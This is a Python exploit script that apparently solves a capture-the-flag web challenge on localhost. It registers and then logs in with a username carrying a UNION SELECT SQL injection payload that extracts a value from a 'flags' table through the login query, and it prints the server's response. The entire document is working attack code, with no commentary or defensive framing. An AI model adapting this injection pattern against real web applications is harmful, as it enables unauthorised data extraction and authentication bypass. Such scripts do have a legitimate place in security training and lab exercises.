import requests
import hashlib
import re 

# Define the URLs for registration and login
register_url = "http://localhost:5000/register"
login_url = "http://localhost:5000/login"

password = "khalil"
hashed_password = hashlib.md5(password.encode()).hexdigest()

#Username to get injected
username = f'"UNION SELECT username,(select flag from flags),"{hashed_password}" from users where username like "%{hashed_password}%";-- '

user_data = {
    "username": username,
    "email": "test@example.com",
    "password": password
}

response = requests.post(register_url, data=user_data)

login_data = {
    "username": username,
    "password": password
}

response = requests.post(login_url, data=login_data)

if response.status_code == 200:
    print("Login successful.")
    content = response.content.decode('utf-8')
    print(response.content)
else:
    print(f"Login failed. Status Code: {response.status_code}")
    print(f"Login Response: {response.text}")